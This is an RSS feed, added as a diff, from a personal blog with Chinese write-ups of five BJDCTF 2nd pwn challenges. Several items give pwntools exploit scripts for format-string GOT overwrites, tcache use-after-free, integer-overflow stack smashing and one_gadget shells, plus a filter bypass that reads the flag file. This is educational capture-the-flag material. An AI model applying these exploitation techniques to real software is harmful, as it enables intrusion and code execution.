@@ -1,0 +1,105 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>BJDCTF 2nd on NiceSeven&#39;s Website</title>
+    <link>https://niceseven.github.io/categories/bjdctf-2nd/</link>
+    <description>Recent content in BJDCTF 2nd on NiceSeven&#39;s Website</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 12 Apr 2020 22:46:52 +0800</lastBuildDate>
+    
+	<atom:link href="https://niceseven.github.io/categories/bjdctf-2nd/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>BJDCTF 2nd Pwn Test</title>
+      <link>https://niceseven.github.io/post/2020/04/12/bjdctf-2nd-pwn-test/</link>
+      <pubDate>Sun, 12 Apr 2020 22:46:52 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/12/bjdctf-2nd-pwn-test/</guid>
+      <description>BJDCTF 2nd Pwn Test ssh连接linux环境，存在flag文件非root无权限读写
+给出了源码闯入参数给数组cmd，经过一系列过滤，最后执行system，所以直接system(&amp;ldquo;cat flag&amp;rdquo;)行不通
+看看环境变量
+使用grep加上正则匹配来筛选出，经过过滤后还有那些命令能执行
+注意这里的-v选项表示：显示不包含匹配文本的所有行，-E表示使用使用ERE模式（扩展正则表达式）的正则匹配来匹配，后门接的就是正则语句
+发现od这条命令还可以用，od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来
+066146-000401就是flag的八进制字节码，转成字符串就行了
+#!/uer/bin/env python3 #-*- coding=UTF-8 -*- import binascii tmp = &amp;#34;066146 063541 030173 061464 063065 061062 026542 061471 060464 032055 060471 026470 030541 030064 061055 033066 030461 030071 030470 031143 076545 077412 046105 001106 000401&amp;#34; for i in tmp.split(&amp;#34;&amp;#34;): try: print(binascii.unhexlify(bytes(hex(int(i,8))[2:],encoding=&amp;#34;UTF-8&amp;#34;)).decode(&amp;#34;utf-8&amp;#34;)[::-1],end=&amp;#34;&amp;#34;) except Exception as e: continue 非预期解
+x86_64命令没有禁用
+原理就是：x86_64链接的是setarch命令，而setarch默认运行程序是/bin/sh，注意这里的权限是root</description>
+    </item>
+    
+    <item>
+      <title>BJDCTF 2nd Pwn R2t4</title>
+      <link>https://niceseven.github.io/post/2020/04/09/bjdctf-2nd-pwn-r2t4/</link>
+      <pubDate>Thu, 09 Apr 2020 15:51:07 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/09/bjdctf-2nd-pwn-r2t4/</guid>
+      <description>BJDCTF 2nd Pwn R2t4 考点:
+1、格式化字符串漏洞修改任意地址内容
+2、了解canary和__stack_chk_fail的工作原理
+64位，开启Canary所以需要leak出canary或者改写__stack_chk_fail等其他方法绕过
+存在后门（system(&amp;ldquo;cat flag&amp;quot;)），存在canary且只可以溢出8字节的数据不够形成rop链，所以无法直接通过栈溢出来cat flag，但是存在格式化字符串漏洞，可以利用此漏洞修改任意地址的内容
+利用格式化字符串漏洞需要知道我们的输入在栈中的偏移，才能使用$n来修改某个偏移位置的指针所指向地址的内容可以利用%p来测试
+这样我们就知道我们的第一个输入在栈中的偏移为6了，这样就可以构造格式化字符串来改写内容了，如下图栈偏移的9、10处覆盖为需要被修改内容的地址也就是指针，然后通过$n就能改写指针内容
+（%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置）
+上下两图栈地址不一样是因为我分开调试的，地址随机化造成的，但是偏移量不变对理解思路无影响
+利用格式化字符串漏洞修改任意地址的漏洞，将__stack_chk_fail@got执行的函数地址修改为system(&amp;ldquo;cat flag&amp;rdquo;)的地址，然后故意覆盖cannry(rbp+8)使执行__stack_chk_fail，这样在执行__stack_chk_fail的时候实际是执行system(&amp;ldquo;cat flag&amp;rdquo;)
+system(&amp;ldquo;cat flag&amp;quot;)的地址为0x00400626，因为是小端存储，所以我们需要将高字节写入高地址，低字节写入低地址，也是就将0x0040写入0x601018+2的地址，0x0626写入0x601018，这样系统再读0x601018的内容时也就识别为0x00400626，
+这里exp使用的$hn表示是以2个字节写入，一次写入2字节，当然也可以选择一次写入4、8字节但是这样可能会导致程序崩溃，所以具体多少字节的写入要看具体情况（%$hhn表示写入的地址空间为1字节，$n表示写入的地址空间为4字节，%$lln表示写入的地址空间为8字节）
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./r2t4&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28578) elf = ELF(&amp;#39;./r2t4&amp;#39;) #gdb.attach(sh) __stack_chk_fail = elf.got[&amp;#39;__stack_chk_fail&amp;#39;] print hex(__stack_chk_fail) #%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置 #%c：输出字符，配上%n可用于向指定地址写数据 #这里payload的意思是将64以双字节(%hn)的形式赋给栈偏移为9的指针，将64+1510也是以双字节的形式赋给栈偏移为10的指针 #当然这里是使用16进制来赋值，64的16进制为0x0040，64+1510的16进制为0x0626 #最后两个p64是为了将栈偏移处覆盖为我们需要的修改的指针，如上图的栈内容 payload = &amp;#39;%64c%9$hn%1510c%10$hnAAA&amp;#39; + p64(__stack_chk_fail+2) + p64(__stack_chk_fail) #pause() sh.sendline(payload) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BJDCTF 2nd Pwn Ydsneedgirlfriend2</title>
+      <link>https://niceseven.github.io/post/2020/03/24/bjdctf-2nd-pwn-ydsneedgirlfriend2/</link>
+      <pubDate>Tue, 24 Mar 2020 21:47:54 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/24/bjdctf-2nd-pwn-ydsneedgirlfriend2/</guid>
+      <description>BJDCTF 2nd Pwn Ydsneedgirlfriend2 考点：tcache UAF堆利用
+环境：ubuntu18.0.4，libc-2.27
+增加、删除、查看，存在个atoi()或许可以改got执行system
+在malloc我们给定的length之前会malloc(0x10)把返回的指针存在girlfriends[]数组中，然后malloc我们给出的chunk把返回的指针存在前面的哪个0x10的chunk中，注意这里的v0的类型(viod **v0)，这里把是把print_girlfriend_name这个函数指针存在了malloc(0x10)的chunk中
+dele函数，这里大概的意思先把指针指向chunk数据的释放，然后在把这个存指针的这个chunk释放，但free的指针未清零，构成UAF的条件
+show函数中箭头实际是执行，在add函数中存在0x10chunk中的print_girlfriend_name函数，回顾c语言知识函数本质也是个指针
+先add3个32字节的chunk看看内存情况
+最开始malloc(0x10)的chunk第1个8字节(0x6032e0)存的是指向最后add的chunk的数据部分的指针，第2个8字节(0x4009ab)存的是个指向print_girlfriend_name函数的指针，回顾上面show函数的代码如果我们调用show就相当于调用这个20字节的chunk中第2个8字节指向的函数，那么利用思路就是根据libc2.26之后的tcachebin的分配规则与fastbin类似，我们free的最后一个chunk，在下次malloc时就是把这个chunk重新分配给用户，但是这个free这个chunk的时候里面存的指向函数的指针并不会置空造成野指针(UAF)，我们想办法把这里的指针改为backdoor地址，也就是把图中0x4009ab改为backdoor的地址0x400d86
+我们先add函数创建1个chunk，实际上创建了2个chunk分别是malloc(0x10)和malloc(length)详见add函数代码，再删除第1个chunk也就是序号为0的chunk，看看内存情况
+通过观察我们猜测在堆开始的地址offset 50处存的是tcache结构
+可以发现dele只删除了8字节的数据，还残留了2个a，因为根据tcache分配规则我们free了0这时候我在add一个16字节的chunk也就会把之前free的序号为0的malloc(0x10)分配给我们，填入8个c然后填入backdoor地址就可以覆盖print_girlfriend_name(0x4009ab)函数的指针为backdoor的指针，然后我们再调用show函数查看我们后add的那个16字节的chunk因为是重新申请的所以序号还是0，就能调用存在0x1ea9260+0x8处的backdoor函数了
+因为又add了0x10的chunk，所以tcache结构中指向malloc(0x10)的指针不见了，返回给用户了
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * #sh = process(&amp;#39;./ydsneedgirlfriend2&amp;#39;) elf = ELF(&amp;#39;./ydsneedgirlfriend2&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,26579) def add(size,name): sh.recvuntil(&amp;#39;:&amp;#39;) sh.sendline(&amp;#39;1&amp;#39;) sh.recvuntil(&amp;#39;name:&amp;#39;) sh.sendline(str(size)) sh.recvuntil(&amp;#39;name:&amp;#39;) sh.sendline(name) def dele(idx): sh.recvuntil(&amp;#39;:&amp;#39;) sh.sendline(&amp;#39;2&amp;#39;) sh.recvuntil(&amp;#39;:&amp;#39;) sh.sendline(str(idx)) def show(idx): sh.recvuntil(&amp;#39;:&amp;#39;) sh.sendline(&amp;#39;3&amp;#39;) sh.recvuntil(&amp;#39;:&amp;#39;) sh.sendline(str(idx)) backdoor = 0x400d86 add(30,&amp;#39;aaaaaaaaaa&amp;#39;) #add(30,&amp;#39;bbbbbbbbbb&amp;#39;) dele(0) #gdb.attach(sh) #dele(1) add(16,&amp;#39;cccccccc&amp;#39;+p64(backdoor)) #gdb.attach(sh) show(0) sh.interactive() 总结：堆题要多动态分析</description>
+    </item>
+    
+    <item>
+      <title>BJDCTF 2nd Pwn R2t3</title>
+      <link>https://niceseven.github.io/post/2020/03/23/bjdctf-2nd-pwn-r2t3/</link>
+      <pubDate>Mon, 23 Mar 2020 23:24:57 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/23/bjdctf-2nd-pwn-r2t3/</guid>
+      <description>BJDCTF 2nd Pwn R2t3 考点：短整数溢出，参考XCTF中的int_overflow
+可以读入0x400进入buf，要满足条件3&amp;lt;v3&amp;lt;=8才能绕过判断执行strcpy，可以发现dest的栈只有0x11，所以这里存在栈溢出，可以发现v3是无符号整形的数据，__int8意味着只能存8位的数字转换成十进制就是0~255这256个字节超出部分就截断了，但是read却可以读0x400进去所以可以利用整形溢出来bypass这个if
+256的2进制串后8位为0000 0000表示10进制数为0，如果通过strlen(s)返回的字节数是256那么v3实际上就表示0
+同理257表示1，258=256+2表示2，259=256+3表示3，所以要满足3&amp;lt;v3&amp;lt;8,，就是256+4=260 &amp;lt; s &amp;lt;264=256+8
+本题选择入读262个字符
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level =&amp;#39;debug&amp;#39; sh = process(&amp;#39;./r2t3&amp;#39;) backdoor_addr = 0x804858b payload = &amp;#39;a&amp;#39;*21 payload += p32(backdoor_addr) payload += &amp;#39;a&amp;#39;*(262-len(payload)) sh.sendafter(&amp;#39;name:&amp;#39;,payload) sh.interactive() 问题：
+读入0x400可以打本地(kali2020.1-glibc-2.29)和buuctf，但是读262字节只能打buu不能打本地，换成ubuntu19.04-glibc-2.29之后读入262可以打本地了</description>
+    </item>
+    
+    <item>
+      <title>BJDCTF 2nd Pwn One_gadget</title>
+      <link>https://niceseven.github.io/post/2020/03/23/bjdctf-2nd-pwn-one_gadget/</link>
+      <pubDate>Mon, 23 Mar 2020 20:17:03 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/23/bjdctf-2nd-pwn-one_gadget/</guid>
+      <description>BJDCTF 2nd Pwn One_gadget 考点：
+1、one_gadget小工具的使用
+2、libc基地址的计算，利用基地址得出其他libc函数的地址
+从main函数来看v4是个函数指针，传入一个函数地址就能执行，但是这里的v4是用%ld接收的所以传入的地址要是10进制的数字串，%ld表示数据按十进制有符号长型整数输入或输出
+有个init，直接打印出printf函数的真实地址，这样就可以通过这个地址减去libc中printf的偏移得到基地址，从而用基地址+one_gadget在libc中的偏移得出execve(&amp;quot;/bin/sh&amp;quot;)的地址，在传给程序就能getshell
+选择0x106ef8这个one_gadget
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./one_gadget&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,26004) libc = ELF(&amp;#39;./ubuntu19-x64-libc-2.29.so&amp;#39;) #sh.recvuntil(&amp;#39;u:&amp;#39;) printf_addr = int(sh.recvuntil(&amp;#39;\n&amp;#39;)[-15:-1],16) #int(s,16)这个函数将字符串转成16进制数 base_addr = printf_addr - libc.symbols[&amp;#39;printf&amp;#39;]#计算基地址 one_gadget = base_addr + 0x106ef8#计算one_gadget的地址 log.success(&amp;#39;printf_addr: &amp;#39; + hex(printf_addr)) log.success(&amp;#39;libc_printf_offset: &amp;#39; + hex(libc.symbols[&amp;#39;printf&amp;#39;])) log.success(&amp;#39;libc_base_addr: &amp;#39; + hex(base_addr)) log.success(&amp;#39;one_gadget_addr: &amp;#39; + hex(one_gadget)) payload = str(one_gadget) #因为是作为字符串传入的所以用str print payload sh.sendlineafter(&amp;#39;one gadget:&amp;#39;,payload) sh.</description>
+    </item>
+    
+  </channel>
+</rss>
